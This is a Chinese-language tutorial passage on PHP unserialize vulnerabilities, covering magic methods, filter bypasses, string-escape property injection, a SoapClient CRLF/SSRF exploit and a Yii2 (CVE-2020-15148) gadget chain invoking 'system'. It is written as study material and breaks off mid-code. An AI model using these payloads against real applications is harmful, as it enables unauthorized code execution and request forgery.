<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$date</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$date</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// array(2) &#123; [&quot;username&quot;]=&gt; string(5) &quot;admin&quot; [&quot;password&quot;]=&gt; string(6) &quot;123456&quot; &#125; </span></span><br></pre></td></tr></table></figure>
</li>
<li><p>__tostring()：把对象被当成字符串使用时调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>__invoke()：把对象被当成函数使用时调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>__call()：当调用一个不存在的方法，传入不存在方法的名称和参数数组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">      // <span class="title">arg1</span> 为函数名</span></span><br><span class="line"><span class="function">      // <span class="title">arg2</span> 为参数数组</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>, <span class="subst">$arg2</span>[0], <span class="subst">$arg2</span>[1], <span class="subst">$arg2</span>[2]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">123</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// callxxx, a, b, 123</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>__callStatic()：静态调用或调用成员常量时使用的方法不存在，传入不存在方法的名称和参数数组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">123</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>__get()：调用的成员属性不存在或访问私有变量，传入不存在成员属性的名称。</p>
</li>
<li><p>__set()：给不存在或不可访问的成员属性赋值，传入不存在成员属性的名称和参数数组。</p>
</li>
<li><p>__isset()：对不存在或不可访问属性使用 isset 或 empty，传入不存在成员属性的名称。</p>
</li>
<li><p>__unset()：对不存在或不可访问属性使用，传入不存在成员属性的名称。</p>
</li>
<li><p>__clone()：当使用clone拷贝完对象后调用。</p>
</li>
</ul>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><ul>
<li><p>利用正则绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"><span class="comment">// O:11: -&gt; O:+11:</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>php对类的大小写不敏感</p>
</li>
<li><p>利用大写S表示十六进制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;S:<span class="number">5</span>:<span class="string">&quot;\x78\x69\x6c\x7a\x79&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用 &amp; 进行引用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$x</span>-&gt;password = &amp;<span class="variable">$x</span>-&gt;token;</span><br><span class="line"><span class="variable">$x</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>字符串逃逸</p>
<p>利用的就是在php里判断序列化后的数据结束是以<code>;&#125;</code>来判断的，如果可以控制序列化里面变量的值，就能够进行截断，多逃逸出一个成员属性。主要分为字符增多类型和字符减少类型。</p>
<p>字符增多：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>) . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="variable">$y</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/admin/&#x27;</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$y</span>);</span><br><span class="line"><span class="comment">// Notice: unserialize(): Error at offset 39 of 71 bytes</span></span><br></pre></td></tr></table></figure>

<p>当对序列化后的数据进行过滤，将 admin 字符替换成 hacker，会发现字符长度变化导致反序列化失败。但当我们构造一下恶意的数据包呢？是否就可以实现逃逸。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fakestr</span> = <span class="string">&#x27;&quot;;s:1:&quot;a&quot;;i:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$fakestr</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$fakestr</span>)) . <span class="variable">$fakestr</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$fakestr</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>) . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:90:&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:1:&quot;a&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="variable">$y</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/admin/&#x27;</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:90:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:1:&quot;a&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$y</span>));</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">&#123; [&quot;username&quot;]=&gt; string(90) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line"><span class="comment">[&quot;password&quot;]=&gt; NULL</span></span><br><span class="line"><span class="comment">[&quot;a&quot;]=&gt; int(1) &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>可以看到已经逃逸出了一个新的成员属性。</p>
<p>字符减少：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>) . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="variable">$y</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/admin/&#x27;</span>, <span class="string">&#x27;wkwk&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;wkwk&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$y</span>);</span><br><span class="line"><span class="comment">// Notice: unserialize(): Error at offset 39 of 69 bytes</span></span><br></pre></td></tr></table></figure>

<p>原理和字符增多一样，同样会报错，直接看demo会比较好理解。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fakestr</span> = <span class="string">&#x27;;s:1:&quot;a&quot;;i:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$bypasslen</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="title function_ invoke__">strlen</span>(<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:15:&#x27;</span>));</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$bypasslen</span>, <span class="variable">$fakestr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>) . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:110:&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:14:&quot;;s:1:&quot;a&quot;;i:1;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$y</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/admin/&#x27;</span>, <span class="string">&#x27;wkwk&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:110:&quot;wkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwk&quot;;s:8:&quot;password&quot;;s:14:&quot;;s:1:&quot;a&quot;;i:1;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$y</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123; [&quot;username&quot;]=&gt; string(110) &quot;wkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwkwk&quot;;s:8:&quot;password&quot;;s:14:&quot;</span></span><br><span class="line"><span class="comment">[&quot;password&quot;]=&gt; NULL</span></span><br><span class="line"><span class="comment">[&quot;a&quot;]=&gt; int(1) &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>可以看到已经逃逸出了一个新的成员属性。</p>
</li>
</ul>
<h2 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h2><h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p>该类可以以HTTP协议发送xml数据。当调用不存在的方法时会执行__call函数，<strong>会导致SSRF</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;bbb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">myfunction</span>();</span><br></pre></td></tr></table></figure>

<p>获取到的HTTP如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231207193004965.png?imageSlim" alt="image-20231207193004965"></p>
<p>发现 User-Agent 和 SOAPAction 字段可控，那么可以截断伪造HTTP包。Exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1,127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>;</span><br><span class="line"><span class="variable">$user_agent</span> .= <span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>);</span><br><span class="line"><span class="variable">$user_agent</span> .= <span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>);</span><br><span class="line"><span class="variable">$user_agent</span> .= <span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">                               <span class="string">&#x27;user_agent&#x27;</span>=&gt; <span class="variable">$user_agent</span>,</span><br><span class="line">                               <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h2><h3 id="Yii2-CVE-2020-15148"><a href="#Yii2-CVE-2020-15148" class="headerlink" title="Yii2(CVE-2020-15148)"></a>Yii2(CVE-2020-15148)</h3><p>漏洞出现在Yii2版本2.0.38之前的版本，这里选择分析2.0.37的源码。</p>
<blockquote>
<p>安装：<a href="https://www.yiichina.com/doc/guide/2.0/start-installation#verifying-installation">https://www.yiichina.com/doc/guide/2.0/start-installation#verifying-installation</a></p>
</blockquote>
<p>从exp开始入手分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;dir&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">IndexAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>漏洞的入口点在 BatchQueryResult 类中，当对象销毁时调用 reset 方法，其中 _dataReader 可控，当控制为一个不存在 close 方法的类时就会触发被控类的 __call 方法，这里用的是 Generator 类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> <span class="keyword">extends</span> <span class="title">BaseObject</span> <span class="keyword">implements</span> \<span class="title">Iterator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// make sure cursor is closed</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">reset</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_dataReader !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_dataReader = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_batch = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_value = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_key = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来分析 Generator 类的 __call 方法，会进一步调用 format，然后会调用 getFormatter，其中发现 formatters 变量是可控的，那么 call_user_func_array 的第一参数就是可控的，而第二个参数是空，也就是要实现无参数RCE，那么就用到了 IndexAction 类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$providers</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$formatters</span> = <span class="keyword">array</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$method</span>, <span class="variable">$attributes</span>); <span class="comment">// method is &#x27;close&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span 